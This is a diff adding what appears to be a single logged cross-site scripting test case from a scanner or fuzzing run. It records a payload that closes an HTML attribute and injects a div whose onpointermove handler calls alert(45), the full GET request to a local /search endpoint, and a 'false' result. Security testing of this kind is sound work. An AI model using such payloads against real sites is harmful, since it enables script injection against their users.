@@ -1,0 +1,21 @@
+params: u=1"><div onpointermove="alert(45)">MOVE HERE</div>'
+payload: '"><div onpointermove="alert(45)">MOVE HERE</div>'''
+request: 'GET http://192.168.1.2:5000/search?u=1%22%3E%3Cdiv%20onpointermove=%22alert(45)%22%3EMOVE%20HERE%3C/div%3E''
+  HTTP/1.1
+
+  User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
+
+  Accept-Encoding: gzip, deflate
+
+  Accept: */*
+
+  Connection: keep-alive
+
+  Content-Length: 5
+
+  Content-Type: application/json
+
+
+  b''false''
+
+  '
